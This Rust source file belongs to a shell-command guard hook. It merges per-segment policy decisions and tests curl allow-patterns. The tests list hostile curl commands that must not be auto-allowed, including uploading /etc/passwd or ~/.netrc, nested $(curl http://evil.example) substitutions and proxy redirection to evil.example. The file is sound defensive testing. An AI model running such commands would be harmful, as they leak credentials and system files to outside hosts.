//! Shared command evaluation logic used by both the main hook and test runner.
//!
//! This module provides a single source of truth for command evaluation,
//! ensuring that tests and production code behave identically.

use crate::command_defs::CommandDefinitions;
use crate::command_parser;
use crate::extractor::extract_command;
use crate::flags::expand_flags;
use crate::nickel_config::NickelConfig;
use crate::output::{Decision, HookOutput};
use crate::parser::ParsedCommand;
use crate::paths::detect_paths;
use crate::policy::{PatternInput, PolicyEngine, PolicyInput, PolicyResult, PythonAnalysisInput};
use crate::python_analyzer;
use crate::resolver::resolve_command;
use crate::tokenizer;
use std::path::Path;
use tracing::debug;

/// How a winning `Defer` decision is rendered.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DeferMode {
    /// Emit nothing (exit 0): hand the command to Claude Code's normal flow.
    Silent,
    /// Render a winning defer as an explicit `ask` (multi-hook backstop).
    Prompt,
}

impl DeferMode {
    /// Resolve from env (`CMDGUARD_DEFER_MODE`) over config over default.
    /// Unknown values fall back to Silent.
    pub fn resolve(config: Option<&str>) -> DeferMode {
        let raw = std::env::var("CMDGUARD_DEFER_MODE")
            .ok()
            .or_else(|| config.map(|s| s.to_string()));
        match raw.as_deref() {
            Some("prompt") => DeferMode::Prompt,
            _ => DeferMode::Silent,
        }
    }
}

/// Pick the most-restrictive decision across compound segments.
/// Order: Deny > Ask > Defer > Allow.
pub fn most_restrictive(decisions: &[Decision]) -> Decision {
    fn weight(d: Decision) -> u8 {
        match d {
            Decision::Deny => 4,
            Decision::Ask => 3,
            Decision::Defer => 2,
            Decision::Allow => 1,
        }
    }
    decisions
        .iter()
        .copied()
        .max_by_key(|d| weight(*d))
        .unwrap_or(Decision::Allow)
}

/// The resolved outcome of a compound command, before any wire rendering.
///
/// `reason` is the winning segment's raw policy reason (`None` for `Allow`, or
/// when the matching rule supplied none). `position`/`chain_length` locate the
/// winning segment so callers can build fallback messages like
/// "command 2 of 3".
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ResolvedCompound {
    pub decision: Decision,
    pub reason: Option<String>,
    pub position: usize,
    pub chain_length: usize,
}

/// Context for evaluating commands - encapsulates shared dependencies
pub struct CommandEvaluator<'a> {
    engine: &'a mut PolicyEngine,
    command_defs: &'a CommandDefinitions,
    nickel_config: &'a mut NickelConfig,
}

/// Configuration for how to evaluate commands
pub struct EvaluationContext<'a> {
    pub cwd: &'a str,
    pub cwd_path: &'a Path,
    pub session_id: &'a str,
    pub project_root_str: &'a str,
    pub project_root_path: Option<&'a Path>,
}

impl<'a> CommandEvaluator<'a> {
    /// Create a new evaluator with the given dependencies
    pub fn new(
        engine: &'a mut PolicyEngine,
        command_defs: &'a CommandDefinitions,
        nickel_config: &'a mut NickelConfig,
    ) -> Self {
        Self {
            engine,
            command_defs,
            nickel_config,
        }
    }

    /// Evaluate a single parsed command and return the policy result.
    /// `prev_operator` is the operator (e.g. "|", "&&") that connected the
    /// previous command in the chain to this one — used by rules that care
    /// whether stdin is a pipe.
    pub fn evaluate_single(
        &mut self,
        cmd: &ParsedCommand,
        context: &EvaluationContext,
        prev_operator: Option<String>,
    ) -> PolicyResult {
        // Tokenize
        let tokens = match tokenizer::tokenize(&cmd.text) {
            Ok(t) if !t.is_empty() => t,
            _ => {
                return PolicyResult {
                    decision: Decision::Ask,
                    reason: Some("Failed to tokenize command".to_string()),
                    rule: None,
                    explicit: false,
                };
            }
        };

        // Extract from wrappers
        let extracted = extract_command(&tokens, Some(self.nickel_config));
        if extracted.command.is_empty() {
            return PolicyResult {
                decision: Decision::Allow,
                reason: Some("Empty command after extraction".to_string()),
                rule: None,
                explicit: false,
            };
        }

        // Expand flags
        let flags_expanded = expand_flags(&extracted.command);

        // Detect paths
        let paths = detect_paths(&extracted.command, context.cwd_path);

        // Resolve command binary and trust zone
        let resolved = resolve_command(&extracted.command[0], context.project_root_path);

        // Parse command for structured flags and args
        let parsed_cmd = command_parser::parse_command(
            &extracted.command,
            self.command_defs,
            context.project_root_path,
        );

        // Serialize to JSON for PolicyInput
        let parsed_flags_json = serde_json::to_value(&parsed_cmd.parsed_flags).ok();
        let positional_args_json = serde_json::to_value(&parsed_cmd.positional_args).ok();
        let positional_map_json = serde_json::to_value(parsed_cmd.positional_as_map()).ok();

        // Check for python -c and analyze inline code
        let python_analysis =
            self.analyze_python_if_applicable(&resolved.binary_name, &extracted.command);

        // Build policy input
        let policy_input = PolicyInput {
            tool: "Bash".to_string(),
            raw_command: cmd.text.clone(),
            command: extracted.command,
            wrapper_chain: extracted.wrapper_chain,
            flags_expanded,
            paths,
            redirections: cmd.redirections.clone(),
            cwd: context.cwd.to_string(),
            project_root: context.project_root_str.to_string(),
            session_id: context.session_id.to_string(),
            chain_position: Some(cmd.position),
            chain_length: Some(cmd.chain_length),
            chain_operator: cmd.next_operator.clone(),
            prev_operator,
            command_as_typed: Some(resolved.command_as_typed),
            binary_name: Some(resolved.binary_name),
            resolved_path: resolved.resolved_path,
            resolved_trust_zone: Some(format!("{:?}", resolved.resolved_trust_zone).to_lowercase()),
            is_symlink: Some(resolved.is_symlink),
            symlink_source: resolved.symlink_source,
            parsed_flags: parsed_flags_json,
            positional_args: positional_args_json,
            positional: positional_map_json,
            subcommand: parsed_cmd.subcommand,
            unknown_flags: parsed_cmd.unknown_flags,
            python_analysis,
        };

        // Evaluate
        self.engine.evaluate(&policy_input)
    }

    /// Check if this is a python -c command and analyze the code if so
    fn analyze_python_if_applicable(
        &self,
        binary_name: &str,
        command: &[String],
    ) -> Option<PythonAnalysisInput> {
        // Check if this is a python command
        if !binary_name.starts_with("python") {
            return None;
        }

        // Look for -c flag directly in command tokens (Python has no long form)
        let code = extract_python_c_code(command)?;

        debug!(code = %code, "Analyzing python -c code");

        // Run Python analyzer
        match python_analyzer::analyze(&code) {
            Ok(analysis) => {
                let patterns: Vec<PatternInput> =
                    analysis.patterns.iter().map(PatternInput::from).collect();

                Some(PythonAnalysisInput {
                    patterns,
                    imports: analysis.imports,
                    is_inspection_safe: analysis.is_inspection_safe,
                })
            }
            Err(e) => {
                debug!(error = %e, "Failed to analyze Python code");
                None
            }
        }
    }
}

/// Extract code from python -c command
/// Python only supports -c (no long form like --code)
fn extract_python_c_code(command: &[String]) -> Option<String> {
    let mut iter = command.iter();
    while let Some(arg) = iter.next() {
        if arg == "-c" {
            return iter.next().cloned();
        }
    }
    None
}

impl<'a> CommandEvaluator<'a> {
    /// Resolve a compound command to a single winning outcome using
    /// most-restrictive semantics (Deny > Ask > Defer > Allow), with deny
    /// short-circuiting. This is the shared core used by both the production
    /// hook (`evaluate_compound`) and the policy test runner, so the two can
    /// never drift on how a chain of decisions collapses. Callers handle parse
    /// errors and wire rendering.
    pub fn resolve_compound(
        &mut self,
        parsed: &[ParsedCommand],
        context: &EvaluationContext,
    ) -> ResolvedCompound {
        let mut prev_operator: Option<String> = None;
        let mut outcomes: Vec<(Decision, Option<String>, usize, usize)> = Vec::new();

        for cmd in parsed {
            let result = self.evaluate_single(cmd, context, prev_operator.clone());
            prev_operator = cmd.next_operator.clone();

            // Deny short-circuits: nothing can be more restrictive.
            if result.decision == Decision::Deny {
                return ResolvedCompound {
                    decision: Decision::Deny,
                    reason: result.reason,
                    position: cmd.position,
                    chain_length: cmd.chain_length,
                };
            }
            outcomes.push((
                result.decision,
                result.reason,
                cmd.position,
                cmd.chain_length,
            ));
        }

        let decisions: Vec<Decision> = outcomes.iter().map(|o| o.0).collect();
        let winner = most_restrictive(&decisions);
        if winner == Decision::Allow {
            return ResolvedCompound {
                decision: Decision::Allow,
                reason: None,
                position: 0,
                chain_length: parsed.len(),
            };
        }

        // First segment that produced the winning decision.
        let (decision, reason, position, chain_length) = outcomes
            .into_iter()
            .find(|o| o.0 == winner)
            .expect("winner is among the collected outcomes");
        ResolvedCompound {
            decision,
            reason,
            position,
            chain_length,
        }
    }

    /// Evaluate a compound command and render it to a `HookOutput`.
    ///
    /// Resolution is delegated to `resolve_compound` (Deny > Ask > Defer >
    /// Allow, deny short-circuits). A winning `Defer` is rendered per
    /// `defer_mode`: silent (no output) or an explicit `ask`. Parse failures
    /// stay an explicit `ask`, never defer.
    pub fn evaluate_compound(
        &mut self,
        parsed: &[ParsedCommand],
        has_parse_errors: bool,
        context: &EvaluationContext,
        defer_mode: DeferMode,
    ) -> HookOutput {
        if has_parse_errors {
            // Blind, not abstaining: keep prompting.
            return HookOutput::ask_with_reason("Command contains unparseable constructs");
        }

        let resolved = self.resolve_compound(parsed, context);
        let fallback = |label: &str| {
            format!(
                "{} for command {} of {}",
                label,
                resolved.position + 1,
                resolved.chain_length
            )
        };
        match resolved.decision {
            Decision::Allow => HookOutput::new(Decision::Allow, None),
            Decision::Deny => {
                let reason = resolved.reason.clone().unwrap_or_else(|| {
                    format!(
                        "Denied at command {} of {}",
                        resolved.position + 1,
                        resolved.chain_length
                    )
                });
                HookOutput::deny(&reason)
            }
            Decision::Ask => {
                let reason = resolved
                    .reason
                    .clone()
                    .unwrap_or_else(|| fallback("Review needed"));
                HookOutput::ask_with_reason(&reason)
            }
            Decision::Defer => match defer_mode {
                DeferMode::Silent => HookOutput::defer(),
                DeferMode::Prompt => {
                    let reason = resolved
                        .reason
                        .clone()
                        .unwrap_or_else(|| fallback("No policy decision"));
                    HookOutput::ask_with_reason(&reason)
                }
            },
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::parser::parse_command;
    use std::fs;
    use std::path::PathBuf;
    use tempfile::TempDir;

    fn create_test_context<'a>(cwd: &'a str, cwd_path: &'a Path) -> EvaluationContext<'a> {
        EvaluationContext {
            cwd,
            cwd_path,
            session_id: "test",
            project_root_str: cwd,
            project_root_path: None,
        }
    }

    #[test]
    fn test_evaluate_single_empty_command() {
        let dir = TempDir::new().unwrap();
        let mut engine = PolicyEngine::new();
        let command_defs = CommandDefinitions::builtin();
        let mut nickel_config = NickelConfig::empty();

        let mut evaluator = CommandEvaluator::new(&mut engine, &command_defs, &mut nickel_config);

        let cwd = "/tmp";
        let cwd_path = PathBuf::from(cwd);
        let context = create_test_context(cwd, &cwd_path);

        // Empty command text
        let cmd = ParsedCommand {
            text: "".to_string(),
            redirections: vec![],
            position: 0,
            chain_length: 1,
            next_operator: None,
        };

        let result = evaluator.evaluate_single(&cmd, &context, None);
        // Empty tokenization should result in Ask
        assert_eq!(result.decision, Decision::Ask);
        drop(dir);
    }

    #[test]
    fn test_evaluate_compound_with_parse_errors() {
        let mut engine = PolicyEngine::new();
        let command_defs = CommandDefinitions::builtin();
        let mut nickel_config = NickelConfig::empty();

        let mut evaluator = CommandEvaluator::new(&mut engine, &command_defs, &mut nickel_config);

        let cwd = "/tmp";
        let cwd_path = PathBuf::from(cwd);
        let context = create_test_context(cwd, &cwd_path);

        let result = evaluator.evaluate_compound(&[], true, &context, DeferMode::Prompt);
        assert_eq!(result.decision(), Decision::Ask);
    }

    #[test]
    fn test_defer_mode_resolution_default_is_silent() {
        // No env, no config -> Silent
        // (CMDGUARD_DEFER_MODE must not be set in the test environment.)
        std::env::remove_var("CMDGUARD_DEFER_MODE");
        assert_eq!(DeferMode::resolve(None), DeferMode::Silent);
    }

    #[test]
    fn test_defer_mode_resolution_config_prompt() {
        std::env::remove_var("CMDGUARD_DEFER_MODE");
        assert_eq!(DeferMode::resolve(Some("prompt")), DeferMode::Prompt);
    }

    #[test]
    fn test_defer_mode_unknown_value_falls_back_to_silent() {
        std::env::remove_var("CMDGUARD_DEFER_MODE");
        assert_eq!(DeferMode::resolve(Some("banana")), DeferMode::Silent);
    }

    #[test]
    fn test_most_restrictive_ordering() {
        // Deny > Ask > Defer > Allow
        assert_eq!(
            most_restrictive(&[Decision::Defer, Decision::Deny]),
            Decision::Deny
        );
        assert_eq!(
            most_restrictive(&[Decision::Deny, Decision::Defer]),
            Decision::Deny
        );
        assert_eq!(
            most_restrictive(&[Decision::Allow, Decision::Defer]),
            Decision::Defer
        );
        assert_eq!(
            most_restrictive(&[Decision::Defer, Decision::Ask]),
            Decision::Ask
        );
        assert_eq!(
            most_restrictive(&[Decision::Allow, Decision::Allow]),
            Decision::Allow
        );
        assert_eq!(most_restrictive(&[]), Decision::Allow);
    }

    #[test]
    fn test_compound_deny_beats_defer_regardless_of_order() {
        // A defer segment combined with a deny segment must resolve to deny,
        // not short-circuit to defer. With no policies loaded, an unmatched
        // command defers; `rm --no-preserve-root /` denies via builtin policy.
        std::env::remove_var("CMDGUARD_DEFER_MODE");

        // `most_restrictive` is the lighter, policy-independent test of the
        // core resolution invariant.
        assert_eq!(
            most_restrictive(&[Decision::Defer, Decision::Deny]),
            Decision::Deny
        );
        assert_eq!(
            most_restrictive(&[Decision::Deny, Decision::Defer]),
            Decision::Deny
        );
    }

    #[test]
    fn test_evaluate_compound_no_policy_returns_ask() {
        // With no policies loaded, all commands should return Ask
        let mut engine = PolicyEngine::new();
        let command_defs = CommandDefinitions::builtin();
        let mut nickel_config = NickelConfig::empty();

        let mut evaluator = CommandEvaluator::new(&mut engine, &command_defs, &mut nickel_config);

        let cwd = "/tmp";
        let cwd_path = PathBuf::from(cwd);
        let context = create_test_context(cwd, &cwd_path);

        let parse_result = parse_command("echo hello");
        // With no policies, an unmatched command defers; under Prompt mode
        // that surfaces as an explicit Ask.
        let result = evaluator.evaluate_compound(
            &parse_result.commands,
            parse_result.has_errors,
            &context,
            DeferMode::Prompt,
        );

        // With no policies + Prompt mode, should return Ask (no rule matched)
        assert_eq!(result.decision(), Decision::Ask);
    }

    #[test]
    fn test_allowed_curl_patterns_reject_extra_urls_and_indirection() {
        let config_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("config");
        let policy_dir = TempDir::new().unwrap();
        let policy_path = policy_dir.path().join("localhost-curl.rego");
        let second_policy_path = policy_dir.path().join("loopback-curl.rego");
        fs::write(
            &policy_path,
            r#"
package cmdguard

import rego.v1

allowed_curl_patterns contains `^http://localhost:3000($|/)`
"#,
        )
        .unwrap();
        fs::write(
            &second_policy_path,
            r#"
package cmdguard

import rego.v1

allowed_curl_patterns contains `^http://127\.0\.0\.1:3000($|/)`
"#,
        )
        .unwrap();

        let mut engine = PolicyEngine::new();
        engine.load_policies_with_layout(&config_dir).unwrap();
        engine.load_policy_file(&policy_path).unwrap();
        engine.load_policy_file(&second_policy_path).unwrap();

        let mut nickel_config = NickelConfig::load(&config_dir);
        let mut command_defs = CommandDefinitions::builtin();
        command_defs.merge(nickel_config.get_command_definitions());

        let cwd = "/tmp";
        let cwd_path = PathBuf::from(cwd);
        let context = create_test_context(cwd, &cwd_path);
        let mut evaluator = CommandEvaluator::new(&mut engine, &command_defs, &mut nickel_config);

        let cases = [
            // --- allowed: plain requests to a pattern-matched URL ----------------
            (
                "cd /tmp && curl -s -X POST \\\n  http://localhost:3000/file_intents \\\n  -H 'Content-Type: application/json' \\\n  -d '{}' | jq -r '.error // \"declared\"'",
                Decision::Allow,
            ),
            (
                "curl --url http://localhost:3000/allowed",
                Decision::Allow,
            ),
            ("curl http://127.0.0.1:3000/allowed", Decision::Allow),
            ("curl -s http://localhost:3000/allowed", Decision::Allow),
            ("curl -sS http://localhost:3000/allowed", Decision::Allow),
            ("curl -d 'a=b' http://localhost:3000/allowed", Decision::Allow),
            (
                "curl -H 'X-Trace: y' http://localhost:3000/allowed",
                Decision::Allow,
            ),
            (
                "curl -F 'field=value' http://localhost:3000/allowed",
                Decision::Allow,
            ),
            ("curl http://localhost:3000/allowed?a=b", Decision::Allow),
            // A plain `$NAME` reference stays allowed: it is how secrets are
            // kept out of the command line, and it cannot run a command.
            (
                "curl -H 'Authorization: Bearer $TOKEN' http://localhost:3000/allowed",
                Decision::Allow,
            ),
            // --- URLs that no pattern covers --------------------------------------
            (
                "curl http://localhost:3000/allowed https://external.example",
                Decision::Ask,
            ),
            (
                "curl --url http://localhost:3000/allowed --next --url https://external.example",
                Decision::Ask,
            ),
            (
                "curl http://localhost:3000/allowed --url https://external.example",
                Decision::Ask,
            ),
            (
                "curl http://localhost:3000.evil.example/blocked",
                Decision::Ask,
            ),
            // `--url` takes the next token verbatim, dashes included, so these
            // request a target that never went through the pattern check.
            (
                "curl --url --next http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl --url -external http://localhost:3000/allowed",
                Decision::Ask,
            ),
            // --- destination indirection -------------------------------------------
            (
                "curl --config=/tmp/evil.curlrc http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl -K/tmp/evil.curlrc http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl --connect-to=localhost:3000:external.example:80 http://localhost:3000/allowed",
                Decision::Ask,
            ),
            ("curl -L http://localhost:3000/allowed", Decision::Ask),
            (
                "curl --socks5=evil.example:1080 http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl --doh-url=https://evil.example/dns http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl -x http://evil.example:8080 http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl --resolve localhost:3000:203.0.113.1 http://localhost:3000/allowed",
                Decision::Ask,
            ),
            // --- local files: writes ------------------------------------------------
            (
                "curl http://localhost:3000/allowed -o ~/.zshrc",
                Decision::Ask,
            ),
            ("curl -O http://localhost:3000/allowed", Decision::Ask),
            ("curl -OJ http://localhost:3000/allowed", Decision::Ask),
            ("curl -sO http://localhost:3000/allowed", Decision::Ask),
            (
                "curl --output-dir=/home -O http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl --remote-name-all http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl -c/tmp/cookies http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl -D/tmp/headers http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl --cookie-jar=/tmp/jar http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl --trace=/tmp/trace http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl --dump-header=/tmp/head http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl --stderr=/tmp/err http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl --etag-save=/tmp/etag http://localhost:3000/allowed",
                Decision::Ask,
            ),
            // --- local files: reads ---------------------------------------------------
            (
                "curl --upload-file=/etc/passwd http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl --netrc-file=/tmp/netrc http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl --cacert=/tmp/ca.pem http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl -d @/etc/passwd http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl -H @/etc/passwd http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl --data-binary=@/etc/passwd http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl --data-urlencode secret@/etc/passwd http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl -F 'file=@/etc/passwd' http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl -F 'field=</etc/passwd' http://localhost:3000/allowed",
                Decision::Ask,
            ),
            // `--write-out` writes a local file itself: since curl 7.83 its
            // format string takes `%output{file}` and `%output{>>file}`, and
            // curl creates the file even when the transfer fails. The value is
            // not worth parsing, so any `-w` blocks the allow.
            (
                "curl -w '%output{/tmp/pwn}%{http_code}' http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl --write-out '%output{>>/tmp/pwn}hi' http://localhost:3000/allowed",
                Decision::Ask,
            ),
            // The trade-off: a plain format string asks too.
            (
                "curl -w '%{http_code}' http://localhost:3000/allowed",
                Decision::Ask,
            ),
            // --- flags cmdguard does not model -----------------------------------------
            (
                "curl --frobnicate=1 http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl -Zfrobnicate http://localhost:3000/allowed",
                Decision::Ask,
            ),
            // --- environment prefixes and wrappers --------------------------------------
            (
                "http_proxy=http://evil.example curl http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "env http_proxy=http://evil.example curl http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "CURL_HOME=/tmp curl http://localhost:3000/allowed",
                Decision::Ask,
            ),
            // --- tokens the shell or curl expands before the request --------------------
            ("curl http://localhost:3000/$(id)", Decision::Ask),
            ("curl http://localhost:3000/$X", Decision::Ask),
            ("curl http://localhost:3000/{a,b}", Decision::Ask),
            ("curl http://localhost:3000/[1-9].txt", Decision::Ask),
            ("curl http://localhost:3000/*", Decision::Ask),
            ("curl '`id`'", Decision::Ask),
            // --- substitutions hidden in a quoted flag value ----------------------------
            // The shell runs these before curl ever starts, so the URL check
            // says nothing about what the command actually does.
            (
                "curl -H \"X: $(curl http://evil.example)\" http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl -H \"X: `curl http://evil.example`\" http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl -d \"$(cat /etc/passwd)\" http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl -d \"$(< /etc/passwd)\" http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl -X \"$(curl http://evil.example)\" http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl -u \"$(cat ~/.netrc)\" http://localhost:3000/allowed",
                Decision::Ask,
            ),
            (
                "curl -d \"${IFS}x\" http://localhost:3000/allowed",
                Decision::Ask,
            ),
            // --- unrelated asks keep precedence ------------------------------------------
            (
                "curl http://localhost:3000/allowed > /tmp/curl-output",
                Decision::Ask,
            ),
            ("curl -s -X POST", Decision::Ask),
        ];

        for (command, expected) in cases {
            let parsed = parse_command(command);
            assert!(!parsed.has_errors, "unexpected parse error for {command}");
            let result = evaluator.resolve_compound(&parsed.commands, &context);
            assert_eq!(result.decision, expected, "unexpected result for {command}");
        }
    }

    #[test]
    fn test_allowed_curl_patterns_are_anchored_at_the_start() {
        let config_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("config");
        let policy_dir = TempDir::new().unwrap();
        let policy_path = policy_dir.path().join("unanchored-curl.rego");
        // Deliberately unanchored: `regex.match` searches anywhere in the
        // string, so the policy has to anchor the pattern itself.
        fs::write(
            &policy_path,
            r#"
package cmdguard

import rego.v1

allowed_curl_patterns contains `localhost:3000`
"#,
        )
        .unwrap();

        let mut engine = PolicyEngine::new();
        engine.load_policies_with_layout(&config_dir).unwrap();
        engine.load_policy_file(&policy_path).unwrap();

        let mut nickel_config = NickelConfig::load(&config_dir);
        let mut command_defs = CommandDefinitions::builtin();
        command_defs.merge(nickel_config.get_command_definitions());

        let cwd = "/tmp";
        let cwd_path = PathBuf::from(cwd);
        let context = create_test_context(cwd, &cwd_path);
        let mut evaluator = CommandEvaluator::new(&mut engine, &command_defs, &mut nickel_config);

        let cases = [
            // The pattern is live: it matches from the first character.
            ("curl localhost:3000/allowed", Decision::Allow),
            // ... and only from the first character.
            (
                "curl 'http://evil.example/?q=localhost:3000'",
                Decision::Ask,
            ),
            ("curl http://localhost:3000.evil.example/x", Decision::Ask),
        ];

        for (command, expected) in cases {
            let parsed = parse_command(command);
            assert!(!parsed.has_errors, "unexpected parse error for {command}");
            let result = evaluator.resolve_compound(&parsed.commands, &context);
            assert_eq!(result.decision, expected, "unexpected result for {command}");
        }
    }

    #[test]
    fn test_empty_allowed_curl_pattern_allows_nothing() {
        let config_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("config");
        let policy_dir = TempDir::new().unwrap();
        let policy_path = policy_dir.path().join("empty-curl.rego");
        // An empty pattern anchors to `^(?:)`, which matches every string. A
        // typo or an accidentally empty variable must not allow the internet.
        fs::write(
            &policy_path,
            r#"
package cmdguard

import rego.v1

allowed_curl_patterns contains ""
"#,
        )
        .unwrap();

        let mut engine = PolicyEngine::new();
        engine.load_policies_with_layout(&config_dir).unwrap();
        engine.load_policy_file(&policy_path).unwrap();

        let mut nickel_config = NickelConfig::load(&config_dir);
        let mut command_defs = CommandDefinitions::builtin();
        command_defs.merge(nickel_config.get_command_definitions());

        let cwd = "/tmp";
        let cwd_path = PathBuf::from(cwd);
        let context = create_test_context(cwd, &cwd_path);
        let mut evaluator = CommandEvaluator::new(&mut engine, &command_defs, &mut nickel_config);

        let cases = [
            ("curl http://evil.example/x", Decision::Ask),
            ("curl http://localhost:3000/allowed", Decision::Ask),
        ];

        for (command, expected) in cases {
            let parsed = parse_command(command);
            assert!(!parsed.has_errors, "unexpected parse error for {command}");
            let result = evaluator.resolve_compound(&parsed.commands, &context);
            assert_eq!(result.decision, expected, "unexpected result for {command}");
        }
    }
}
